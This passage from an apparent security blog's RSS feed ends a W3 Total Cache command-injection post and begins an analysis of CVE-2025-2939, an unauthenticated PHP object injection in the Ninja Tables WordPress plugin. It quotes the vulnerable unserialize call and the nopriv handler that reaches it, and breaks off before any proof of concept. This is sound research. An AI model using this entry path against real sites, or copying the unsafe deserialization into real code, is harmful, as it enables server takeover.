harder.&lt;/li&gt;&#xA;&lt;li&gt;Immediate plugin update is mandatory for systems using &amp;lt;= 2.8.12.&lt;/li&gt;&#xA;&lt;li&gt;Avoid &lt;code&gt;eval()&lt;/code&gt; in PHP unless strictly sandboxed and validated.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/command-injection.html&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Command Injection&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/w3-total-cache/vulnerability/wordpress-w3-total-cache-plugin-2-8-13-unauthenticated-command-injection-vulnerability&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress W3 Total Cache Plugin &amp;lt; 2.8.13 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2939 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-11-21-cve-2025-2939/</link>
      <pubDate>Fri, 21 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-11-21-cve-2025-2939/</guid>
      <category domain="http://localhost:1313/categories/cve-analyst/">CVE Analyst</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;The WordPress plugin Ninja Tables – Easy Data Table Builder contains a &lt;strong&gt;PHP Object Injection&lt;/strong&gt; vulnerability in all versions up to 5.0.18, due to unsafe deserialization of user-provided data from the parameter &lt;code&gt;args[callback]&lt;/code&gt;. This allows an unauthenticated attacker to supply a malicious PHP object.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2939&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2939&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.0.18&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0.19&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-tables/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables – Easy Data Table Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Ninja Tables – Easy Data Table Builder&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0.18&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0.19&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34;target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;In the vulnerable version (v5.0.18):&lt;/strong&gt;&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;base64_decode&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;callback&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]));&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In this code, the &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; function is executed directly on user input (&lt;code&gt;$params[&#39;callback&#39;]&lt;/code&gt; after base64 decoding). This introduces a severe vulnerability:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Object Injection Risk&lt;/strong&gt;: If an attacker injects a serialized PHP object in base64 form, decoding and unserializing the data will instantiate the malicious object, leading to &lt;strong&gt;Object Injection&lt;/strong&gt; and potential &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Lack of Input Validation&lt;/strong&gt;: No validation of the data is performed before calling unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;No fallback mechanism&lt;/strong&gt;: If the supplied data is invalid or malicious, no error-handling or safe alternative exists, increasing exploitability.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Patched version (v5.0.19):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; href=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/diff.png&#34; title=&#34;Patch change&#34; data-thumbnail=&#34;/posts/2025-11-21-cve-2025-2939/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Patch change&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-21-cve-2025-2939/diff.png&#39; alt=&#34;Diff&#34; height=&#34;746&#34; width=&#34;1813&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch change&lt;/figcaption&gt;&#xD;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;unserialize()&lt;/code&gt; was replaced with &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Removing &lt;code&gt;unserialize()&lt;/code&gt; eliminates the possibility of &lt;code&gt;PHP&amp;ensp;Object&amp;ensp;Injection&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;getCallback()&lt;/code&gt; is invoked inside the &lt;code&gt;registerAsyncRequestHandler()&lt;/code&gt; function:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;registerAsyncRequestHandler&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$action&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;makeAsyncRequestAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;App&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;addAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin_post_nopriv_&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$action&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&amp;ensp;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;App&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;make&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;request&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$requestUrl&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;args.url&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$requestMethod&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;args.method&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$client&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;Client&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;make&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$requestUrl&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$request&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;action&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;args.url&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;args.method&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;)[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;args&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line hl&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nv&#34;&gt;$callback&lt;/span&gt;&amp;ensp;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;getCallback&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$params&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;o&#34;&gt;...&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The function registers an Ajax endpoint for unauthenticated users (&lt;code&gt;admin_post_nopriv_&lt;/code&gt;) and retrieves the &lt;code&gt;action&lt;/code&gt; value using &lt;code&gt;makeAsyncRequestAction()&lt;/code&gt;:&lt;/p&gt;&#xA;&#xA;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt;&amp;ensp;&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&amp;ensp;&lt;span class=&#34;nf&#34;&gt;makeAsyncRequestAction&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;k&#34;&gt;return&lt;/span&gt;&amp;ensp;&lt;span class=&#34;s1&#34;&gt;&amp;#39;wpf-async-request-&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sha1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;nx&#34;&gt;App&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;::&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;config&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;app.slug&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;ensp;&amp;ensp;&amp;ensp;&amp;ensp;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This returns 